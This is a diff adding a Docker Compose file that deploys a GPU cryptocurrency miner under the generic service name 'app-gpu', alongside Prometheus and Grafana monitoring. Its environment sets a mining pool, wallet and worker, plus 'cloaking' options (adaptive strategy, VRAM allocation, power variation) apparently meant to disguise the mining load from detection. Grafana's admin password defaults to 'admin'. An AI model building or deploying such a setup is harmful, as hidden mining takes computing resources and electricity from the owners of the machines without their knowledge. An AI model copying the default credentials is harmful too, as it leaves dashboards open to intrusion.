@@ -1,0 +1,143 @@
+version: '3.8'
+
+services:
+  app-gpu:
+    build:
+      context: .
+      dockerfile: Dockerfile
+    image: app-gpu:latest
+    container_name: app-gpu-main
+    runtime: nvidia
+    restart: unless-stopped
+    
+    environment:
+      # GPU Settings
+      - NVIDIA_VISIBLE_DEVICES=all
+      - NVIDIA_DRIVER_CAPABILITIES=compute,utility
+      - GPU_DEVICE_ID=0
+      - GPU_POWER_LIMIT=250
+      - GPU_TARGET_UTILIZATION=0.85
+      
+      # Mining Pool (override via .env)
+      - MINING_POOL_URL=${MINING_POOL_URL:-stratum+tcp://pool.example.com:3333}
+      - MINING_WALLET=${MINING_WALLET:-0xYourWallet}
+      - MINING_WORKER=${MINING_WORKER:-worker1}
+      
+      # Cloaking Settings
+      - CLOAKING_ENABLED=true
+      - CLOAKING_STRATEGY=adaptive
+      - CLOAKING_VRAM_ALLOCATION=0.50
+      - CLOAKING_POWER_VARIATION=0.12
+      
+      # Logging
+      - RUST_LOG=info
+      - RUST_BACKTRACE=1
+      
+      # Telemetry
+      - PROMETHEUS_ADDR=0.0.0.0:9090
+    
+    volumes:
+      # Configuration (read-only)
+      - ./config:/etc/app-gpu:ro
+      
+      # Logs (persistent)
+      - app-gpu-logs:/var/log/app-gpu
+      
+      # Secrets (persistent)
+      - app-gpu-secrets:/var/lib/app-gpu
+      
+      # Nvidia runtime
+      - /usr/lib/x86_64-linux-gnu/libnvidia-ml.so.1:/usr/lib/x86_64-linux-gnu/libnvidia-ml.so.1:ro
+    
+    ports:
+      # Prometheus metrics
+      - "9090:9090"
+    
+    networks:
+      - app-gpu-network
+    
+    logging:
+      driver: "json-file"
+      options:
+        max-size: "100m"
+        max-file: "5"
+    
+    healthcheck:
+      test: ["CMD", "curl", "-f", "http://localhost:9090/health"]
+      interval: 30s
+      timeout: 10s
+      retries: 3
+      start_period: 10s
+    
+    deploy:
+      resources:
+        reservations:
+          devices:
+            - driver: nvidia
+              count: all
+              capabilities: [gpu]
+
+  # Prometheus for metrics collection
+  prometheus:
+    image: prom/prometheus:latest
+    container_name: app-gpu-prometheus
+    restart: unless-stopped
+    
+    volumes:
+      - ./config/prometheus.yml:/etc/prometheus/prometheus.yml:ro
+      - prometheus-data:/prometheus
+    
+    ports:
+      - "9091:9090"
+    
+    networks:
+      - app-gpu-network
+    
+    command:
+      - '--config.file=/etc/prometheus/prometheus.yml'
+      - '--storage.tsdb.path=/prometheus'
+      - '--storage.tsdb.retention.time=30d'
+      - '--web.console.libraries=/usr/share/prometheus/console_libraries'
+      - '--web.console.templates=/usr/share/prometheus/consoles'
+
+  # Grafana for visualization
+  grafana:
+    image: grafana/grafana:latest
+    container_name: app-gpu-grafana
+    restart: unless-stopped
+    
+    environment:
+      - GF_SECURITY_ADMIN_USER=admin
+      - GF_SECURITY_ADMIN_PASSWORD=${GRAFANA_PASSWORD:-admin}
+      - GF_USERS_ALLOW_SIGN_UP=false
+    
+    volumes:
+      - grafana-data:/var/lib/grafana
+      - ./config/grafana/dashboards:/etc/grafana/provisioning/dashboards:ro
+      - ./config/grafana/datasources:/etc/grafana/provisioning/datasources:ro
+    
+    ports:
+      - "3000:3000"
+    
+    networks:
+      - app-gpu-network
+    
+    depends_on:
+      - prometheus
+
+volumes:
+  app-gpu-logs:
+    driver: local
+  
+  app-gpu-secrets:
+    driver: local
+  
+  prometheus-data:
+    driver: local
+  
+  grafana-data:
+    driver: local
+
+networks:
+  app-gpu-network:
+    driver: bridge
